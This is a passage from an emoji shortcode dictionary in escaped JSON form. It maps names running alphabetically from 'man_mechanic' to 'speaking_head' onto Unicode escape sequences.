\"\ud83e\udd39\u200d\u2642\",\n    \":man_mechanic:\": \"\ud83d\udc68\u200d\ud83d\udd27\",\n    \":man_office_worker:\": \"\ud83d\udc68\u200d\ud83d\udcbc\",\n    \":man_pilot:\": \"\ud83d\udc68\u200d\u2708\",\n    \":man_playing_handball:\": \"\ud83e\udd3e\u200d\u2642\",\n    \":man_playing_water_polo:\": \"\ud83e\udd3d\u200d\u2642\",\n    \":man_scientist:\": \"\ud83d\udc68\u200d\ud83d\udd2c\",\n    \":man_shrugging:\": \"\ud83e\udd37\u200d\u2642\",\n    \":man_singer:\": \"\ud83d\udc68\u200d\ud83c\udfa4\",\n    \":man_student:\": \"\ud83d\udc68\u200d\ud83c\udf93\",\n    \":man_teacher:\": \"\ud83d\udc68\u200d\ud83c\udfeb\",\n    \":man_technologist:\": \"\ud83d\udc68\u200d\ud83d\udcbb\",\n    \":man_with_gua_pi_mao:\": \"\ud83d\udc72\",\n    \":man_with_probing_cane:\": \"\ud83d\udc68\u200d\ud83e\uddaf\",\n    \":man_with_turban:\": \"\ud83d\udc73\u200d\u2642\",\n    \":mandarin:\": \"\ud83c\udf4a\",\n    \":mango:\": \"\ud83e\udd6d\",\n    \":mans_shoe:\": \"\ud83d\udc5e\",\n    \":mantelpiece_clock:\": \"\ud83d\udd70\",\n    \":manual_wheelchair:\": \"\ud83e\uddbd\",\n    \":maple_leaf:\": \"\ud83c\udf41\",\n    \":marshall_islands:\": \"\ud83c\uddf2\u200d\ud83c\udded\",\n    \":martial_arts_uniform:\": \"\ud83e\udd4b\",\n    \":martinique:\": \"\ud83c\uddf2\u200d\ud83c\uddf6\",\n    \":mask:\": \"\ud83d\ude37\",\n    \":massage:\": \"\ud83d\udc86\",\n    \":massage_man:\": \"\ud83d\udc86\u200d\u2642\",\n    \":massage_woman:\": \"\ud83d\udc86\u200d\u2640\",\n    \":mate:\": \"\ud83e\uddc9\",\n    \":mauritania:\": \"\ud83c\uddf2\u200d\ud83c\uddf7\",\n    \":mauritius:\": \"\ud83c\uddf2\u200d\ud83c\uddfa\",\n    \":mayotte:\": \"\ud83c\uddfe\u200d\ud83c\uddf9\",\n    \":meat_on_bone:\": \"\ud83c\udf56\",\n    \":mechanic:\": \"\ud83e\uddd1\u200d\ud83d\udd27\",\n    \":mechanical_arm:\": \"\ud83e\uddbe\",\n    \":mechanical_leg:\": \"\ud83e\uddbf\",\n    \":medal_military:\": \"\ud83c\udf96\",\n    \":medal_sports:\": \"\ud83c\udfc5\",\n    \":medical_symbol:\": \"\u2695\",\n    \":mega:\": \"\ud83d\udce3\",\n    \":melon:\": \"\ud83c\udf48\",\n    \":memo:\": \"\ud83d\udcdd\",\n    \":men_wrestling:\": \"\ud83e\udd3c\u200d\u2642\",\n    \":menorah:\": \"\ud83d\udd4e\",\n    \":mens:\": \"\ud83d\udeb9\",\n    \":mermaid:\": \"\ud83e\udddc\u200d\u2640\",\n    \":merman:\": \"\ud83e\udddc\u200d\u2642\",\n    \":merperson:\": \"\ud83e\udddc\",\n    \":metal:\": \"\ud83e\udd18\",\n    \":metro:\": \"\ud83d\ude87\",\n    \":mexico:\": \"\ud83c\uddf2\u200d\ud83c\uddfd\",\n    \":microbe:\": \"\ud83e\udda0\",\n    \":micronesia:\": \"\ud83c\uddeb\u200d\ud83c\uddf2\",\n    \":microphone:\": \"\ud83c\udfa4\",\n    \":microscope:\": \"\ud83d\udd2c\",\n    \":middle_finger:\": \"\ud83d\udd95\",\n    \":milk_glass:\": \"\ud83e\udd5b\",\n    \":milky_way:\": \"\ud83c\udf0c\",\n    \":minibus:\": \"\ud83d\ude90\",\n    \":minidisc:\": \"\ud83d\udcbd\",\n    \":mobile_phone_off:\": \"\ud83d\udcf4\",\n    \":moldova:\": \"\ud83c\uddf2\u200d\ud83c\udde9\",\n    \":monaco:\": \"\ud83c\uddf2\u200d\ud83c\udde8\",\n    \":money_mouth_face:\": \"\ud83e\udd11\",\n    \":money_with_wings:\": \"\ud83d\udcb8\",\n    \":moneybag:\": \"\ud83d\udcb0\",\n    \":mongolia:\": \"\ud83c\uddf2\u200d\ud83c\uddf3\",\n    \":monkey:\": \"\ud83d\udc12\",\n    \":monkey_face:\": \"\ud83d\udc35\",\n    \":monocle_face:\": \"\ud83e\uddd0\",\n    \":monorail:\": \"\ud83d\ude9d\",\n    \":montenegro:\": \"\ud83c\uddf2\u200d\ud83c\uddea\",\n    \":montserrat:\": \"\ud83c\uddf2\u200d\ud83c\uddf8\",\n    \":moon:\": \"\ud83c\udf14\",\n    \":moon_cake:\": \"\ud83e\udd6e\",\n    \":morocco:\": \"\ud83c\uddf2\u200d\ud83c\udde6\",\n    \":mortar_board:\": \"\ud83c\udf93\",\n    \":mosque:\": \"\ud83d\udd4c\",\n    \":mosquito:\": \"\ud83e\udd9f\",\n    \":motor_boat:\": \"\ud83d\udee5\",\n    \":motor_scooter:\": \"\ud83d\udef5\",\n    \":motorcycle:\": \"\ud83c\udfcd\",\n    \":motorized_wheelchair:\": \"\ud83e\uddbc\",\n    \":motorway:\": \"\ud83d\udee3\",\n    \":mount_fuji:\": \"\ud83d\uddfb\",\n    \":mountain:\": \"\u26f0\",\n    \":mountain_bicyclist:\": \"\ud83d\udeb5\",\n    \":mountain_biking_man:\": \"\ud83d\udeb5\u200d\u2642\",\n    \":mountain_biking_woman:\": \"\ud83d\udeb5\u200d\u2640\",\n    \":mountain_cableway:\": \"\ud83d\udea0\",\n    \":mountain_railway:\": \"\ud83d\ude9e\",\n    \":mountain_snow:\": \"\ud83c\udfd4\",\n    \":mouse:\": \"\ud83d\udc2d\",\n    \":mouse2:\": \"\ud83d\udc01\",\n    \":movie_camera:\": \"\ud83c\udfa5\",\n    \":moyai:\": \"\ud83d\uddff\",\n    \":mozambique:\": \"\ud83c\uddf2\u200d\ud83c\uddff\",\n    \":mrs_claus:\": \"\ud83e\udd36\",\n    \":muscle:\": \"\ud83d\udcaa\",\n    \":mushroom:\": \"\ud83c\udf44\",\n    \":musical_keyboard:\": \"\ud83c\udfb9\",\n    \":musical_note:\": \"\ud83c\udfb5\",\n    \":musical_score:\": \"\ud83c\udfbc\",\n    \":mute:\": \"\ud83d\udd07\",\n    \":myanmar:\": \"\ud83c\uddf2\u200d\ud83c\uddf2\",\n    \":nail_care:\": \"\ud83d\udc85\",\n    \":name_badge:\": \"\ud83d\udcdb\",\n    \":namibia:\": \"\ud83c\uddf3\u200d\ud83c\udde6\",\n    \":national_park:\": \"\ud83c\udfde\",\n    \":nauru:\": \"\ud83c\uddf3\u200d\ud83c\uddf7\",\n    \":nauseated_face:\": \"\ud83e\udd22\",\n    \":nazar_amulet:\": \"\ud83e\uddff\",\n    \":necktie:\": \"\ud83d\udc54\",\n    \":negative_squared_cross_mark:\": \"\u274e\",\n    \":nepal:\": \"\ud83c\uddf3\u200d\ud83c\uddf5\",\n    \":nerd_face:\": \"\ud83e\udd13\",\n    \":netherlands:\": \"\ud83c\uddf3\u200d\ud83c\uddf1\",\n    \":neutral_face:\": \"\ud83d\ude10\",\n    \":new:\": \"\ud83c\udd95\",\n    \":new_caledonia:\": \"\ud83c\uddf3\u200d\ud83c\udde8\",\n    \":new_moon:\": \"\ud83c\udf11\",\n    \":new_moon_with_face:\": \"\ud83c\udf1a\",\n    \":new_zealand:\": \"\ud83c\uddf3\u200d\ud83c\uddff\",\n    \":newspaper:\": \"\ud83d\udcf0\",\n    \":newspaper_roll:\": \"\ud83d\uddde\",\n    \":next_track_button:\": \"\u23ed\",\n    \":ng:\": \"\ud83c\udd96\",\n    \":ng_man:\": \"\ud83d\ude45\u200d\u2642\",\n    \":ng_woman:\": \"\ud83d\ude45\u200d\u2640\",\n    \":nicaragua:\": \"\ud83c\uddf3\u200d\ud83c\uddee\",\n    \":niger:\": \"\ud83c\uddf3\u200d\ud83c\uddea\",\n    \":nigeria:\": \"\ud83c\uddf3\u200d\ud83c\uddec\",\n    \":night_with_stars:\": \"\ud83c\udf03\",\n    \":nine:\": \"9\u200d\u20e3\",\n    \":niue:\": \"\ud83c\uddf3\u200d\ud83c\uddfa\",\n    \":no_bell:\": \"\ud83d\udd15\",\n    \":no_bicycles:\": \"\ud83d\udeb3\",\n    \":no_entry:\": \"\u26d4\",\n    \":no_entry_sign:\": \"\ud83d\udeab\",\n    \":no_good:\": \"\ud83d\ude45\",\n    \":no_good_man:\": \"\ud83d\ude45\u200d\u2642\",\n    \":no_good_woman:\": \"\ud83d\ude45\u200d\u2640\",\n    \":no_mobile_phones:\": \"\ud83d\udcf5\",\n    \":no_mouth:\": \"\ud83d\ude36\",\n    \":no_pedestrians:\": \"\ud83d\udeb7\",\n    \":no_smoking:\": \"\ud83d\udead\",\n    \":non-potable_water:\": \"\ud83d\udeb1\",\n    \":norfolk_island:\": \"\ud83c\uddf3\u200d\ud83c\uddeb\",\n    \":north_korea:\": \"\ud83c\uddf0\u200d\ud83c\uddf5\",\n    \":northern_mariana_islands:\": \"\ud83c\uddf2\u200d\ud83c\uddf5\",\n    \":norway:\": \"\ud83c\uddf3\u200d\ud83c\uddf4\",\n    \":nose:\": \"\ud83d\udc43\",\n    \":notebook:\": \"\ud83d\udcd3\",\n    \":notebook_with_decorative_cover:\": \"\ud83d\udcd4\",\n    \":notes:\": \"\ud83c\udfb6\",\n    \":nut_and_bolt:\": \"\ud83d\udd29\",\n    \":o:\": \"\u2b55\",\n    \":o2:\": \"\ud83c\udd7e\",\n    \":ocean:\": \"\ud83c\udf0a\",\n    \":octopus:\": \"\ud83d\udc19\",\n    \":oden:\": \"\ud83c\udf62\",\n    \":office:\": \"\ud83c\udfe2\",\n    \":office_worker:\": \"\ud83e\uddd1\u200d\ud83d\udcbc\",\n    \":oil_drum:\": \"\ud83d\udee2\",\n    \":ok:\": \"\ud83c\udd97\",\n    \":ok_hand:\": \"\ud83d\udc4c\",\n    \":ok_man:\": \"\ud83d\ude46\u200d\u2642\",\n    \":ok_person:\": \"\ud83d\ude46\",\n    \":ok_woman:\": \"\ud83d\ude46\u200d\u2640\",\n    \":old_key:\": \"\ud83d\udddd\",\n    \":older_adult:\": \"\ud83e\uddd3\",\n    \":older_man:\": \"\ud83d\udc74\",\n    \":older_woman:\": \"\ud83d\udc75\",\n    \":om:\": \"\ud83d\udd49\",\n    \":oman:\": \"\ud83c\uddf4\u200d\ud83c\uddf2\",\n    \":on:\": \"\ud83d\udd1b\",\n    \":oncoming_automobile:\": \"\ud83d\ude98\",\n    \":oncoming_bus:\": \"\ud83d\ude8d\",\n    \":oncoming_police_car:\": \"\ud83d\ude94\",\n    \":oncoming_taxi:\": \"\ud83d\ude96\",\n    \":one:\": \"1\u200d\u20e3\",\n    \":one_piece_swimsuit:\": \"\ud83e\ude71\",\n    \":onion:\": \"\ud83e\uddc5\",\n    \":open_book:\": \"\ud83d\udcd6\",\n    \":open_file_folder:\": \"\ud83d\udcc2\",\n    \":open_hands:\": \"\ud83d\udc50\",\n    \":open_mouth:\": \"\ud83d\ude2e\",\n    \":open_umbrella:\": \"\u2602\",\n    \":ophiuchus:\": \"\u26ce\",\n    \":orange:\": \"\ud83c\udf4a\",\n    \":orange_book:\": \"\ud83d\udcd9\",\n    \":orange_circle:\": \"\ud83d\udfe0\",\n    \":orange_heart:\": \"\ud83e\udde1\",\n    \":orange_square:\": \"\ud83d\udfe7\",\n    \":orangutan:\": \"\ud83e\udda7\",\n    \":orthodox_cross:\": \"\u2626\",\n    \":otter:\": \"\ud83e\udda6\",\n    \":outbox_tray:\": \"\ud83d\udce4\",\n    \":owl:\": \"\ud83e\udd89\",\n    \":ox:\": \"\ud83d\udc02\",\n    \":oyster:\": \"\ud83e\uddaa\",\n    \":package:\": \"\ud83d\udce6\",\n    \":page_facing_up:\": \"\ud83d\udcc4\",\n    \":page_with_curl:\": \"\ud83d\udcc3\",\n    \":pager:\": \"\ud83d\udcdf\",\n    \":paintbrush:\": \"\ud83d\udd8c\",\n    \":pakistan:\": \"\ud83c\uddf5\u200d\ud83c\uddf0\",\n    \":palau:\": \"\ud83c\uddf5\u200d\ud83c\uddfc\",\n    \":palestinian_territories:\": \"\ud83c\uddf5\u200d\ud83c\uddf8\",\n    \":palm_tree:\": \"\ud83c\udf34\",\n    \":palms_up_together:\": \"\ud83e\udd32\",\n    \":panama:\": \"\ud83c\uddf5\u200d\ud83c\udde6\",\n    \":pancakes:\": \"\ud83e\udd5e\",\n    \":panda_face:\": \"\ud83d\udc3c\",\n    \":paperclip:\": \"\ud83d\udcce\",\n    \":paperclips:\": \"\ud83d\udd87\",\n    \":papua_new_guinea:\": \"\ud83c\uddf5\u200d\ud83c\uddec\",\n    \":parachute:\": \"\ud83e\ude82\",\n    \":paraguay:\": \"\ud83c\uddf5\u200d\ud83c\uddfe\",\n    \":parasol_on_ground:\": \"\u26f1\",\n    \":parking:\": \"\ud83c\udd7f\",\n    \":parrot:\": \"\ud83e\udd9c\",\n    \":part_alternation_mark:\": \"\u303d\",\n    \":partly_sunny:\": \"\u26c5\",\n    \":partying_face:\": \"\ud83e\udd73\",\n    \":passenger_ship:\": \"\ud83d\udef3\",\n    \":passport_control:\": \"\ud83d\udec2\",\n    \":pause_button:\": \"\u23f8\",\n    \":paw_prints:\": \"\ud83d\udc3e\",\n    \":peace_symbol:\": \"\u262e\",\n    \":peach:\": \"\ud83c\udf51\",\n    \":peacock:\": \"\ud83e\udd9a\",\n    \":peanuts:\": \"\ud83e\udd5c\",\n    \":pear:\": \"\ud83c\udf50\",\n    \":pen:\": \"\ud83d\udd8a\",\n    \":pencil:\": \"\ud83d\udcdd\",\n    \":pencil2:\": \"\u270f\",\n    \":penguin:\": \"\ud83d\udc27\",\n    \":pensive:\": \"\ud83d\ude14\",\n    \":people_holding_hands:\": \"\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1\",\n    \":performing_arts:\": \"\ud83c\udfad\",\n    \":persevere:\": \"\ud83d\ude23\",\n    \":person_bald:\": \"\ud83e\uddd1\u200d\ud83e\uddb2\",\n    \":person_curly_hair:\": \"\ud83e\uddd1\u200d\ud83e\uddb1\",\n    \":person_fencing:\": \"\ud83e\udd3a\",\n    \":person_in_manual_wheelchair:\": \"\ud83e\uddd1\u200d\ud83e\uddbd\",\n    \":person_in_motorized_wheelchair:\": \"\ud83e\uddd1\u200d\ud83e\uddbc\",\n    \":person_red_hair:\": \"\ud83e\uddd1\u200d\ud83e\uddb0\",\n    \":person_white_hair:\": \"\ud83e\uddd1\u200d\ud83e\uddb3\",\n    \":person_with_probing_cane:\": \"\ud83e\uddd1\u200d\ud83e\uddaf\",\n    \":person_with_turban:\": \"\ud83d\udc73\",\n    \":peru:\": \"\ud83c\uddf5\u200d\ud83c\uddea\",\n    \":petri_dish:\": \"\ud83e\uddeb\",\n    \":philippines:\": \"\ud83c\uddf5\u200d\ud83c\udded\",\n    \":phone:\": \"\u260e\",\n    \":pick:\": \"\u26cf\",\n    \":pie:\": \"\ud83e\udd67\",\n    \":pig:\": \"\ud83d\udc37\",\n    \":pig2:\": \"\ud83d\udc16\",\n    \":pig_nose:\": \"\ud83d\udc3d\",\n    \":pill:\": \"\ud83d\udc8a\",\n    \":pilot:\": \"\ud83e\uddd1\u200d\u2708\",\n    \":pinching_hand:\": \"\ud83e\udd0f\",\n    \":pineapple:\": \"\ud83c\udf4d\",\n    \":ping_pong:\": \"\ud83c\udfd3\",\n    \":pirate_flag:\": \"\ud83c\udff4\u200d\u2620\",\n    \":pisces:\": \"\u2653\",\n    \":pitcairn_islands:\": \"\ud83c\uddf5\u200d\ud83c\uddf3\",\n    \":pizza:\": \"\ud83c\udf55\",\n    \":place_of_worship:\": \"\ud83d\uded0\",\n    \":plate_with_cutlery:\": \"\ud83c\udf7d\",\n    \":play_or_pause_button:\": \"\u23ef\",\n    \":pleading_face:\": \"\ud83e\udd7a\",\n    \":point_down:\": \"\ud83d\udc47\",\n    \":point_left:\": \"\ud83d\udc48\",\n    \":point_right:\": \"\ud83d\udc49\",\n    \":point_up:\": \"\u261d\",\n    \":point_up_2:\": \"\ud83d\udc46\",\n    \":poland:\": \"\ud83c\uddf5\u200d\ud83c\uddf1\",\n    \":police_car:\": \"\ud83d\ude93\",\n    \":police_officer:\": \"\ud83d\udc6e\",\n    \":policeman:\": \"\ud83d\udc6e\u200d\u2642\",\n    \":policewoman:\": \"\ud83d\udc6e\u200d\u2640\",\n    \":poodle:\": \"\ud83d\udc29\",\n    \":poop:\": \"\ud83d\udca9\",\n    \":popcorn:\": \"\ud83c\udf7f\",\n    \":portugal:\": \"\ud83c\uddf5\u200d\ud83c\uddf9\",\n    \":post_office:\": \"\ud83c\udfe3\",\n    \":postal_horn:\": \"\ud83d\udcef\",\n    \":postbox:\": \"\ud83d\udcee\",\n    \":potable_water:\": \"\ud83d\udeb0\",\n    \":potato:\": \"\ud83e\udd54\",\n    \":pouch:\": \"\ud83d\udc5d\",\n    \":poultry_leg:\": \"\ud83c\udf57\",\n    \":pound:\": \"\ud83d\udcb7\",\n    \":pout:\": \"\ud83d\ude21\",\n    \":pouting_cat:\": \"\ud83d\ude3e\",\n    \":pouting_face:\": \"\ud83d\ude4e\",\n    \":pouting_man:\": \"\ud83d\ude4e\u200d\u2642\",\n    \":pouting_woman:\": \"\ud83d\ude4e\u200d\u2640\",\n    \":pray:\": \"\ud83d\ude4f\",\n    \":prayer_beads:\": \"\ud83d\udcff\",\n    \":pregnant_woman:\": \"\ud83e\udd30\",\n    \":pretzel:\": \"\ud83e\udd68\",\n    \":previous_track_button:\": \"\u23ee\",\n    \":prince:\": \"\ud83e\udd34\",\n    \":princess:\": \"\ud83d\udc78\",\n    \":printer:\": \"\ud83d\udda8\",\n    \":probing_cane:\": \"\ud83e\uddaf\",\n    \":puerto_rico:\": \"\ud83c\uddf5\u200d\ud83c\uddf7\",\n    \":punch:\": \"\ud83d\udc4a\",\n    \":purple_circle:\": \"\ud83d\udfe3\",\n    \":purple_heart:\": \"\ud83d\udc9c\",\n    \":purple_square:\": \"\ud83d\udfea\",\n    \":purse:\": \"\ud83d\udc5b\",\n    \":pushpin:\": \"\ud83d\udccc\",\n    \":put_litter_in_its_place:\": \"\ud83d\udeae\",\n    \":qatar:\": \"\ud83c\uddf6\u200d\ud83c\udde6\",\n    \":question:\": \"\u2753\",\n    \":rabbit:\": \"\ud83d\udc30\",\n    \":rabbit2:\": \"\ud83d\udc07\",\n    \":raccoon:\": \"\ud83e\udd9d\",\n    \":racehorse:\": \"\ud83d\udc0e\",\n    \":racing_car:\": \"\ud83c\udfce\",\n    \":radio:\": \"\ud83d\udcfb\",\n    \":radio_button:\": \"\ud83d\udd18\",\n    \":radioactive:\": \"\u2622\",\n    \":rage:\": \"\ud83d\ude21\",\n    \":railway_car:\": \"\ud83d\ude83\",\n    \":railway_track:\": \"\ud83d\udee4\",\n    \":rainbow:\": \"\ud83c\udf08\",\n    \":rainbow_flag:\": \"\ud83c\udff3\u200d\ud83c\udf08\",\n    \":raised_back_of_hand:\": \"\ud83e\udd1a\",\n    \":raised_eyebrow:\": \"\ud83e\udd28\",\n    \":raised_hand:\": \"\u270b\",\n    \":raised_hand_with_fingers_splayed:\": \"\ud83d\udd90\",\n    \":raised_hands:\": \"\ud83d\ude4c\",\n    \":raising_hand:\": \"\ud83d\ude4b\",\n    \":raising_hand_man:\": \"\ud83d\ude4b\u200d\u2642\",\n    \":raising_hand_woman:\": \"\ud83d\ude4b\u200d\u2640\",\n    \":ram:\": \"\ud83d\udc0f\",\n    \":ramen:\": \"\ud83c\udf5c\",\n    \":rat:\": \"\ud83d\udc00\",\n    \":razor:\": \"\ud83e\ude92\",\n    \":receipt:\": \"\ud83e\uddfe\",\n    \":record_button:\": \"\u23fa\",\n    \":recycle:\": \"\u267b\",\n    \":red_car:\": \"\ud83d\ude97\",\n    \":red_circle:\": \"\ud83d\udd34\",\n    \":red_envelope:\": \"\ud83e\udde7\",\n    \":red_haired_man:\": \"\ud83d\udc68\u200d\ud83e\uddb0\",\n    \":red_haired_woman:\": \"\ud83d\udc69\u200d\ud83e\uddb0\",\n    \":red_square:\": \"\ud83d\udfe5\",\n    \":registered:\": \"\u00ae\",\n    \":relaxed:\": \"\u263a\",\n    \":relieved:\": \"\ud83d\ude0c\",\n    \":reminder_ribbon:\": \"\ud83c\udf97\",\n    \":repeat:\": \"\ud83d\udd01\",\n    \":repeat_one:\": \"\ud83d\udd02\",\n    \":rescue_worker_helmet:\": \"\u26d1\",\n    \":restroom:\": \"\ud83d\udebb\",\n    \":reunion:\": \"\ud83c\uddf7\u200d\ud83c\uddea\",\n    \":revolving_hearts:\": \"\ud83d\udc9e\",\n    \":rewind:\": \"\u23ea\",\n    \":rhinoceros:\": \"\ud83e\udd8f\",\n    \":ribbon:\": \"\ud83c\udf80\",\n    \":rice:\": \"\ud83c\udf5a\",\n    \":rice_ball:\": \"\ud83c\udf59\",\n    \":rice_cracker:\": \"\ud83c\udf58\",\n    \":rice_scene:\": \"\ud83c\udf91\",\n    \":right_anger_bubble:\": \"\ud83d\uddef\",\n    \":ring:\": \"\ud83d\udc8d\",\n    \":ringed_planet:\": \"\ud83e\ude90\",\n    \":robot:\": \"\ud83e\udd16\",\n    \":rocket:\": \"\ud83d\ude80\",\n    \":rofl:\": \"\ud83e\udd23\",\n    \":roll_eyes:\": \"\ud83d\ude44\",\n    \":roll_of_paper:\": \"\ud83e\uddfb\",\n    \":roller_coaster:\": \"\ud83c\udfa2\",\n    \":romania:\": \"\ud83c\uddf7\u200d\ud83c\uddf4\",\n    \":rooster:\": \"\ud83d\udc13\",\n    \":rose:\": \"\ud83c\udf39\",\n    \":rosette:\": \"\ud83c\udff5\",\n    \":rotating_light:\": \"\ud83d\udea8\",\n    \":round_pushpin:\": \"\ud83d\udccd\",\n    \":rowboat:\": \"\ud83d\udea3\",\n    \":rowing_man:\": \"\ud83d\udea3\u200d\u2642\",\n    \":rowing_woman:\": \"\ud83d\udea3\u200d\u2640\",\n    \":ru:\": \"\ud83c\uddf7\u200d\ud83c\uddfa\",\n    \":rugby_football:\": \"\ud83c\udfc9\",\n    \":runner:\": \"\ud83c\udfc3\",\n    \":running:\": \"\ud83c\udfc3\",\n    \":running_man:\": \"\ud83c\udfc3\u200d\u2642\",\n    \":running_shirt_with_sash:\": \"\ud83c\udfbd\",\n    \":running_woman:\": \"\ud83c\udfc3\u200d\u2640\",\n    \":rwanda:\": \"\ud83c\uddf7\u200d\ud83c\uddfc\",\n    \":sa:\": \"\ud83c\ude02\",\n    \":safety_pin:\": \"\ud83e\uddf7\",\n    \":safety_vest:\": \"\ud83e\uddba\",\n    \":sagittarius:\": \"\u2650\",\n    \":sailboat:\": \"\u26f5\",\n    \":sake:\": \"\ud83c\udf76\",\n    \":salt:\": \"\ud83e\uddc2\",\n    \":samoa:\": \"\ud83c\uddfc\u200d\ud83c\uddf8\",\n    \":san_marino:\": \"\ud83c\uddf8\u200d\ud83c\uddf2\",\n    \":sandal:\": \"\ud83d\udc61\",\n    \":sandwich:\": \"\ud83e\udd6a\",\n    \":santa:\": \"\ud83c\udf85\",\n    \":sao_tome_principe:\": \"\ud83c\uddf8\u200d\ud83c\uddf9\",\n    \":sari:\": \"\ud83e\udd7b\",\n    \":sassy_man:\": \"\ud83d\udc81\u200d\u2642\",\n    \":sassy_woman:\": \"\ud83d\udc81\u200d\u2640\",\n    \":satellite:\": \"\ud83d\udce1\",\n    \":satisfied:\": \"\ud83d\ude06\",\n    \":saudi_arabia:\": \"\ud83c\uddf8\u200d\ud83c\udde6\",\n    \":sauna_man:\": \"\ud83e\uddd6\u200d\u2642\",\n    \":sauna_person:\": \"\ud83e\uddd6\",\n    \":sauna_woman:\": \"\ud83e\uddd6\u200d\u2640\",\n    \":sauropod:\": \"\ud83e\udd95\",\n    \":saxophone:\": \"\ud83c\udfb7\",\n    \":scarf:\": \"\ud83e\udde3\",\n    \":school:\": \"\ud83c\udfeb\",\n    \":school_satchel:\": \"\ud83c\udf92\",\n    \":scientist:\": \"\ud83e\uddd1\u200d\ud83d\udd2c\",\n    \":scissors:\": \"\u2702\",\n    \":scorpion:\": \"\ud83e\udd82\",\n    \":scorpius:\": \"\u264f\",\n    \":scotland:\": \"\ud83c\udff4\u200d\udb40\udc67\u200d\udb40\udc62\u200d\udb40\udc73\u200d\udb40\udc63\u200d\udb40\udc74\u200d\udb40\udc7f\",\n    \":scream:\": \"\ud83d\ude31\",\n    \":scream_cat:\": \"\ud83d\ude40\",\n    \":scroll:\": \"\ud83d\udcdc\",\n    \":seat:\": \"\ud83d\udcba\",\n    \":secret:\": \"\u3299\",\n    \":see_no_evil:\": \"\ud83d\ude48\",\n    \":seedling:\": \"\ud83c\udf31\",\n    \":selfie:\": \"\ud83e\udd33\",\n    \":senegal:\": \"\ud83c\uddf8\u200d\ud83c\uddf3\",\n    \":serbia:\": \"\ud83c\uddf7\u200d\ud83c\uddf8\",\n    \":service_dog:\": \"\ud83d\udc15\u200d\ud83e\uddba\",\n    \":seven:\": \"7\u200d\u20e3\",\n    \":seychelles:\": \"\ud83c\uddf8\u200d\ud83c\udde8\",\n    \":shallow_pan_of_food:\": \"\ud83e\udd58\",\n    \":shamrock:\": \"\u2618\",\n    \":shark:\": \"\ud83e\udd88\",\n    \":shaved_ice:\": \"\ud83c\udf67\",\n    \":sheep:\": \"\ud83d\udc11\",\n    \":shell:\": \"\ud83d\udc1a\",\n    \":shield:\": \"\ud83d\udee1\",\n    \":shinto_shrine:\": \"\u26e9\",\n    \":ship:\": \"\ud83d\udea2\",\n    \":shirt:\": \"\ud83d\udc55\",\n    \":shit:\": \"\ud83d\udca9\",\n    \":shoe:\": \"\ud83d\udc5e\",\n    \":shopping:\": \"\ud83d\udecd\",\n    \":shopping_cart:\": \"\ud83d\uded2\",\n    \":shorts:\": \"\ud83e\ude73\",\n    \":shower:\": \"\ud83d\udebf\",\n    \":shrimp:\": \"\ud83e\udd90\",\n    \":shrug:\": \"\ud83e\udd37\",\n    \":shushing_face:\": \"\ud83e\udd2b\",\n    \":sierra_leone:\": \"\ud83c\uddf8\u200d\ud83c\uddf1\",\n    \":signal_strength:\": \"\ud83d\udcf6\",\n    \":singapore:\": \"\ud83c\uddf8\u200d\ud83c\uddec\",\n    \":singer:\": \"\ud83e\uddd1\u200d\ud83c\udfa4\",\n    \":sint_maarten:\": \"\ud83c\uddf8\u200d\ud83c\uddfd\",\n    \":six:\": \"6\u200d\u20e3\",\n    \":six_pointed_star:\": \"\ud83d\udd2f\",\n    \":skateboard:\": \"\ud83d\udef9\",\n    \":ski:\": \"\ud83c\udfbf\",\n    \":skier:\": \"\u26f7\",\n    \":skull:\": \"\ud83d\udc80\",\n    \":skull_and_crossbones:\": \"\u2620\",\n    \":skunk:\": \"\ud83e\udda8\",\n    \":sled:\": \"\ud83d\udef7\",\n    \":sleeping:\": \"\ud83d\ude34\",\n    \":sleeping_bed:\": \"\ud83d\udecc\",\n    \":sleepy:\": \"\ud83d\ude2a\",\n    \":slightly_frowning_face:\": \"\ud83d\ude41\",\n    \":slightly_smiling_face:\": \"\ud83d\ude42\",\n    \":slot_machine:\": \"\ud83c\udfb0\",\n    \":sloth:\": \"\ud83e\udda5\",\n    \":slovakia:\": \"\ud83c\uddf8\u200d\ud83c\uddf0\",\n    \":slovenia:\": \"\ud83c\uddf8\u200d\ud83c\uddee\",\n    \":small_airplane:\": \"\ud83d\udee9\",\n    \":small_blue_diamond:\": \"\ud83d\udd39\",\n    \":small_orange_diamond:\": \"\ud83d\udd38\",\n    \":small_red_triangle:\": \"\ud83d\udd3a\",\n    \":small_red_triangle_down:\": \"\ud83d\udd3b\",\n    \":smile:\": \"\ud83d\ude04\",\n    \":smile_cat:\": \"\ud83d\ude38\",\n    \":smiley:\": \"\ud83d\ude03\",\n    \":smiley_cat:\": \"\ud83d\ude3a\",\n    \":smiling_face_with_three_hearts:\": \"\ud83e\udd70\",\n    \":smiling_imp:\": \"\ud83d\ude08\",\n    \":smirk:\": \"\ud83d\ude0f\",\n    \":smirk_cat:\": \"\ud83d\ude3c\",\n    \":smoking:\": \"\ud83d\udeac\",\n    \":snail:\": \"\ud83d\udc0c\",\n    \":snake:\": \"\ud83d\udc0d\",\n    \":sneezing_face:\": \"\ud83e\udd27\",\n    \":snowboarder:\": \"\ud83c\udfc2\",\n    \":snowflake:\": \"\u2744\",\n    \":snowman:\": \"\u26c4\",\n    \":snowman_with_snow:\": \"\u2603\",\n    \":soap:\": \"\ud83e\uddfc\",\n    \":sob:\": \"\ud83d\ude2d\",\n    \":soccer:\": \"\u26bd\",\n    \":socks:\": \"\ud83e\udde6\",\n    \":softball:\": \"\ud83e\udd4e\",\n    \":solomon_islands:\": \"\ud83c\uddf8\u200d\ud83c\udde7\",\n    \":somalia:\": \"\ud83c\uddf8\u200d\ud83c\uddf4\",\n    \":soon:\": \"\ud83d\udd1c\",\n    \":sos:\": \"\ud83c\udd98\",\n    \":sound:\": \"\ud83d\udd09\",\n    \":south_africa:\": \"\ud83c\uddff\u200d\ud83c\udde6\",\n    \":south_georgia_south_sandwich_islands:\": \"\ud83c\uddec\u200d\ud83c\uddf8\",\n    \":south_sudan:\": \"\ud83c\uddf8\u200d\ud83c\uddf8\",\n    \":space_invader:\": \"\ud83d\udc7e\",\n    \":spades:\": \"\u2660\",\n    \":spaghetti:\": \"\ud83c\udf5d\",\n    \":sparkle:\": \"\u2747\",\n    \":sparkler:\": \"\ud83c\udf87\",\n    \":sparkles:\": \"\u2728\",\n    \":sparkling_heart:\": \"\ud83d\udc96\",\n    \":speak_no_evil:\": \"\ud83d\ude4a\",\n    \":speaker:\": \"\ud83d\udd08\",\n    \":speaking_head:\": \"\ud83d\udde3\",\n    